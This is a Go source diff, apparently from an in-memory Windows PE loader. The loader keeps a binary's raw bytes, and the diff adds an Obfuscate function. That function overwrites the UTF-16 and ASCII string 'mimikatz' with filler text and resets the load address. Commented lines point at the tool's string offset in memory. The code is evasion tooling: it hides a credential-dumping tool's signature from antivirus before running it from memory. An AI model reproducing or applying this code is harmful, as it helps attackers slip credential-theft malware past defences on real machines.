@@ -4,6 +4,7 @@ import (
 	"errors"
 	"io/ioutil"
 	"net/http"
+	"regexp"
 	"strings"
 
 	. "unsafe"
@@ -52,7 +53,7 @@ func NewBinaryFromDisk(path string) (*Bin, error) {
 	if dat[0] != 77 || dat[1] != 90 {
 		return nil, errors.New("Not a valid PE file")
 	}
-	return &Bin{Address: Pointer(&dat[0])}, nil
+	return &Bin{Address: Pointer(&dat[0]), Data: dat}, nil
 }
 
 func NewBinaryFromHTTP(path string) (*Bin, error) {
@@ -82,6 +83,21 @@ func NewBinary(api *Win, size uint) (*Bin, error) {
 		return nil, err
 	}
 	return &Bin{Address: Pointer(addr)}, nil
+}
+
+func Obfuscate() {
+	re := regexp.MustCompile("\x00\x6d\x00\x69\x00\x6d\x00\x69\x00\x6b\x00\x61\x00\x74\x00\x7A")
+	//dat = re.ReplaceAll(dat, []byte("\x00\x61\x00\x61\x00\x61\x00\x61"))
+	Binary.Data = re.ReplaceAll(Binary.Data, []byte("\x00\x61\x00\x61\x00\x61\x00\x61\x00\x61\x00\x61\x00\x61\x00\x61"))
+	Binary.Address = Pointer(&Binary.Data[0])
+
+	re2 := regexp.MustCompile(`mimikatz`)
+	Binary.Data = re2.ReplaceAll(Binary.Data, []byte("yoyoyoyo"))
+	Binary.Address = Pointer(&Binary.Data[0])
+	//ptrMimiUnicode := Binary.GetAddr() + 0xD7748
+	//fmt.Printf("unicode: %s\n", string(Wapi.UstrVal(Pointer(ptrMimiUnicode))))
+	//os.Exit(0)
+
 }
 
 func AllocateMemory() (err error) {
